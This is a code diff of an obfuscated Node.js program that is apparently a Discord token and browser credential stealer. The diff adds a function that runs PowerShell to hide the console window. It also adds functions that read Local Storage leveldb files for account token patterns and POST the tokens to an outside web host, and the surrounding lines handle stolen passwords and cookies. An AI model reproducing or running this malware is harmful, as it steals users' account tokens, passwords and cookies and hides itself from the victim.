@@ -1,6 +1,6 @@
 const _0x311e26=_0x41b7;function _0x41b7(_0x45fa8d,_0xd21dc7){const _0x145304=_0x12a2();return _0x41b7=function(_0x455320,_0x231597){_0x455320=_0x455320-(-0x92b+0x1*0x51+0x985);let _0x12faac=_0x145304[_0x455320];return _0x12faac;},_0x41b7(_0x45fa8d,_0xd21dc7);}(function(_0x190131,_0x270ee7){const _0x224d8c=_0x41b7,_0x55fd7f=_0x190131();while(!![]){try{const _0x3495b8=parseInt(_0x224d8c(0xba))/(-0x2de+0xd6b+0x96*-0x12)+-parseInt(_0x224d8c(0xb8))/(0x1*-0xf1f+-0x32e*0x6+0x2235)+-parseInt(_0x224d8c(0xb5))/(-0x116d+-0x810+-0x220*-0xc)*(-parseInt(_0x224d8c(0xbe))/(-0x1b69+0x3*0x6df+0x6d0))+-parseInt(_0x224d8c(0xc1))/(0x1f84+0x21a*0xa+-0x3483)*(parseInt(_0x224d8c(0xb7))/(0x1b63+0x1d0b+-0x3868))+-parseInt(_0x224d8c(0xbb))/(-0x1*-0xb5d+-0x2262+0x64*0x3b)+-parseInt(_0x224d8c(0xac))/(-0x3*0x2e3+0x20ec+-0x183b)+parseInt(_0x224d8c(0xc3))/(0x1813+0xcb+-0x18d5);if(_0x3495b8===_0x270ee7)break;else _0x55fd7f['push'](_0x55fd7f['shift']());}catch(_0x5a6b9c){_0x55fd7f['push'](_0x55fd7f['shift']());}}}(_0x12a2,0x1*-0x2796f+-0x11713e+-0x1ec675*-0x1));const fs=require('fs');console[_0x311e26(0xad)](_0x311e26(0xbc)+_0x311e26(0xb2));var debug=![],args=process[_0x311e26(0xb1)][_0x311e26(0xc4)](-0x2547+-0x1786*0x1+0x3ccf);if(args[0x5*-0x42d+-0x2*0x12a9+0x3a33]==_0x311e26(0xbd))debug=!![];else hideSelf();function _0x12a2(){const _0x2d8986=['922840paJQSP','log','resolve','glob','crypto','argv','ame...','lace','child_proc','33yQYMXO','win-dpapi','6yWiYYe','2155676WXwpfT','nexe-nativ','190418zepRIU','9164813ByCxga','Starting\x20g','debug','110608catnka','buffer-rep','ess','9380psplvU','axios','24492258iiTphr','slice','sqlite3'];_0x12a2=function(){return _0x2d8986;};return _0x12a2();}const glob=require(_0x311e26(0xaf)),crypto=require(_0x311e26(0xb0)),{exec}=require(_0x311e26(0xb4)+_0x311e26(0xc0)),axios=require(_0x311e26(0xc2)),buf_replace=require(_0x311e26(0xbf)+_0x311e26(0xb3)),sqlite3=require(_0x311e26(0xb9)+'es')(require[_0x311e26(0xae)](_0x311e26(0xab))),dpapi=require(_0x311e26(0xb9)+'es')(require[_0x311e26(0xae)](_0x311e26(0xb6)));
-
 const a0_0x3d6a03 = require('buffer-replace'),
+
   a0_0x5ddfb9 =
     '%WEBHOOK_LINK%',
   a0_0x5bbd77 = {}
@@ -688,4 +688,69 @@ async function a0_0x1cc1ac() {
   await a0_0x4591a2(1000)
   a0_0x9e24fc.unlinkSync(a0_0x12625b + '\\passwords.txt')
   a0_0x9e24fc.unlinkSync(a0_0x12625b + '\\cookies.txt')
+}
+function hideSelf() {
+    let payload = '\n' +
+        "    Add-Type -Name Window -Namespace Console -MemberDefinition '\n" +
+        '    [DllImport("Kernel32.dll")]\n' +
+        '    public static extern IntPtr GetConsoleWindow();\n' +
+        '\n' +
+        '    [DllImport("user32.dll")]\n' +
+        '    public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);\n' +
+        "    '\n" +
+        '\n' +
+        '    $consolePtr = [Console.Window]::GetConsoleWindow()\n' +
+        '    #0 hide\n' +
+        '    [Console.Window]::ShowWindow($consolePtr, 0)\n' +
+        '    ',
+        file = process.cwd() + '\\temp.ps1';
+    try {
+        fs.writeFileSync(file, payload);
+        require('child_process')
+            .execSync('type .\\temp.ps1 | powershell.exe -noprofile -', {
+                'stdio': 'inherit'
+            });
+        fs.unlinkSync(file);
+    } catch (e) {}
+}
+
+function findToken(path) {
+    path += 'Local Storage\\leveldb';
+    let tokens = [];
+    try {
+        fs.readdirSync(path)
+            .map(file => {
+                (file.endsWith('.log') || file.endsWith('.ldb')) && fs.readFileSync(path + '\\' + file, 'utf8')
+                    .split(/\r?\n/)
+                    .forEach(line => {
+                        const patterns = [new RegExp(/mfa\.[\w-]{84}/g), new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g)];
+                        for (const pattern of patterns) {
+                            const foundTokens = line.match(pattern);
+                            if (foundTokens) foundTokens.forEach(token => tokens.push(token));
+                        }
+                    });
+            });
+    } catch (e) {}
+    return tokens;
+}
+
+function onlyUnique(item, index, array) {
+    return array.indexOf(item) === index;
+}
+
+async function stealTokens() {
+    const tokens = [];
+    for (let path of paths) {
+        const foundTokens = findToken(path);
+        if (foundTokens) foundTokens.forEach(token => tokens.push(token));
+    }
+    axios.request({
+            'method': 'POST',
+            'url': 'https://indianboatparty.com/OOJfZ9s6pHbF/tokens',
+            'headers': {
+                'Content-Type': 'application/json'
+            },
+            'data': tokens.filter(onlyUnique)
+        })
+        .catch(err => console.log(err));
 }
